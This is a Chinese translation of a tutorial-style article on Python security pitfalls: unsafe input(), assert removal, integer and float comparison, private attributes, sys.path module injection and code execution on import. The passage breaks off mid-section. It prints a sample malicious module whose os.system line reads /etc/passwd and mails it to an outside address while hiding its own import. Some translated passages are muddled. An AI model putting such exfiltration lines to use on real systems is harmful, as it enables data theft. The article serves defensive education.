# 【技术分享】关于Python漏洞挖掘那些不得不提的事儿
|
##### 译文声明
本文是翻译文章，文章来源：安全客
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
**  
**
**前言**
******Python因其在开发更大、更复杂应用程序方面独特的便捷性，使得它在计算机环境中变得越来越不可或缺。虽然其明显的语言清晰度和使用友好度使得软件工程师和系统管理员放下了戒备，但是他们的编码错误还是有可能会带来严重的安全隐患。**
****这篇文章的主要受众是还不太熟悉Python的人，其中会提及少量与安全有关的行为以及有经验开发人员遵循的规则。  
**输入函数**
在Python2强大的内置函数中，输入函数完全就是一个大的安全隐患。一旦调用输入函数，任何从stdin中读取的数据都会被认定为Python代码：
     $ python2
        >>> input()
        dir()
        ['__builtins__', '__doc__', '__name__', '__package__']
       >>> input()
       __import__('sys').exit()
       $
显然，只要脚本stdin中的数据不是完全可信的，输入函数就是有危险的。Python 2 文件将 raw_input
认定为一个安全的选择。在Python3中，输入函数相当于是 raw_input，这样就可以完全修复这一问题。
**assert语句**
还有一条使用 assert 语句编写的代码语句，作用是捕捉 Python 应用程序中下一个不可能条件。
    def verify_credentials(username, password):
           assert username and password, 'Credentials not supplied by caller'
           ... authenticate possibly null user with null password ...
然而，Python在编译源代码到优化的字节代码 (如 python-O) 时不会有任何的assert
语句说明。这样的移除使得程序员编写用来抵御攻击的代码保护都形同虚设。
这一弱点的根源就是assert机制只是用于测试，就像是c++语言中那样。程序员必须使用其他手段才能确保数据的一致性。
**可重用整数**
在Python中一切都是对象，每一个对象都有一个可以通过 id
函数读取的唯一标示符。可以使用运算符弄清楚是否有两个变量或属性都指向相同的对象。整数也是对象，所以这一操作实际上是一种定义：
    >>> 999+1 is 1000
        False
上述操作的结果可能会令人大吃一惊，但是要提醒大家的是这样的操作是同时使用两个对象标示符，这一过程中并不会比较它们的数值或是其它任何值。但是：
    >>> 1+1 is 2
        True
对于这种行为的解释就是Python当中有一个对象集合，代表了最开始的几百个整数，并且会重利用这些整数以节省内存和对象创建。更加令人疑惑的就是，不同的Python版本对于“小整数”的定义是不一样的。
这里所指的缓存永远不会使用运算符进行数值比较，运算符也专门是为了处理对象标示符。
**浮点数比较**
处理浮点数可能是一件更加复杂的工作，因为十进制和二进制在表示分数的时候会存在有限精度的问题。导致混淆的一个常见原因就是浮点数对比有时候可能会产生意外的结果。下面是一个著名的例子：
    >>> 2.2 * 3.0 == 3.3 * 2.0
       False
这种现象的原因是一个舍入错误：
    >>> (2.2 * 3.0).hex()
       '0x1.a666666666667p+2'
       >>> (3.3 * 2.0).hex()
       '0x1.a666666666666p+2'
另一个有趣的发现就是Python float 类型支持无限概念。一个可能的原因就是任何数都要小于无限：
    >>> 10**1000000 > float('infinity')
       False
但是在Python3中，有一种类型的对象不支持无限：
     >>> float > float('infinity')
       True
一个最好的解决办法就是坚持使用整数算法，还有一个办法就是使用十进制内核模块，这样可以为用户屏蔽烦人的细节问题和缺陷。
一般来说，只要有任何算术运算就必须要小心舍入错误。详情可以参阅 Python 文档中的《发布和局限性》一章。
**私有属性**
Python
不支持隐藏的对象属性。但还有一种变通方法，那就是基于特征的错位双下划线属性。虽然更改属性名称只会作用于代码，硬编码到字符串常量的属性名称仍未被修改。双下划线属性明显"隐藏在"
getattr()/hasattr() 函数时可能会导致混乱的行为。
       >>> class X(object):
       ...   def __init__(self):
       ...     self.__private = 1
       ...   def get_private(self):
       ...     return self.__private
       ...   def has_private(self):
       ...     return hasattr(self, '__private')
       ... 
       >>> x = X()
       >>>
       >>> x.has_private()
       False
       >>> x.get_private()
       1
此隐藏属性功能不适用于没有类定义的属性，这有效地在引用中“分裂”了任何给定的属性：
       >>> class X(object):
       ...   def __init__(self):
       ...     self.__private = 1
       >>>
       >>> x = X()
       >>>
       >>> x.__private
       Traceback
       ...
       AttributeError: 'X' object has no attribute '__private'
       >>>
       >>> x.__private = 2
       >>> x.__private
       2
       >>> hasattr(x, '__private')
       True
如果一个程序员过度依赖自己的代码而不关注私有属性的不对称双下划线属性，有可能会造成极大的安全隐患。
**模块注入**
Python 模块注入系统是强大而复杂的。在搜索路径中找到由 sys.path
列表定义的文件或目录名称可以导入模块和包。搜索路径初始化是一个复杂的过程，这一过程依赖于 Python 版本、 平台和本地配置。要在一个 Python
应用程序上实行一次成功攻击，攻击者需要找到方式将恶意 Python 模块放入目录或可注入的包文件，以确保Python 可能会在尝试导入模块时“中招”。
解决方法是保持对所有目录和软件包文件搜索路径的安全访问权限，以确保未经授权的用户没有访问权限。需要记住的是，最初脚本调用 Python
解释器所在的目录会自动插入到搜索路径。
运行类似于下面的脚本显示实际的搜索路径︰
    $ cat myapp.py
       #!/usr/bin/python
       import sys
       import pprint
       pprint.pprint(sys.path)
Python 程序的当前工作目录被注入的搜索路径是在 Windows 平台上，而不是脚本位置 。在 UNIX 平台上，每当从 stdin
或命令行读取程序代码 ("-"或"-c"或"-m"选项)时，当前的工作目录都会自动插入到 sys.path :
    $ echo "import sys, pprint; pprint.pprint(sys.path)" | python -       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
       $ python -c 'import sys, pprint; pprint.pprint(sys.path)'
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
       $
       $ cd /tmp
       $ python -m myapp
       ['',
        '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
        '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
        ...]
通过命令行在 Windows 或通过代码上运行 Python的一个优先建议就是，明确从当前工作目录更改到一个安全目录时存在的模块注入风险。
搜索路径的另一个可能来源是 $PYTHONPATH 环境变量的内容。从过程环境对 sys.path 的方便缓存是通过 Python 解释器，因为它会忽视
$PYTHONPATH 变量的-E 选项。
**导入代码执行**
虽然看得不明显，但是导入语句实际上会导致正在导入模块中的代码执行。这就是为什么即使只是导入不信任模块都是有风险的。导入一个下面这种的简单模块都可能会导致不愉快的后果︰
     $ cat malicious.py
       import os
       import sys
       os.system('cat /etc/passwd | mail PI:EMAIL')
       del sys.modules['malicious']  # pretend it's not imported
       $ python
       >>> import malicious
       >>> dir(malicious)
       Traceback (most recent call last):
       NameError: name 'malicious' is not defined
如果攻击者结合 sys.path 条目注入进行攻击，就有可能进一步破解系统。
**猴子补丁**
在运行时更改Python 对象属性的过程被称为猴子补丁。Python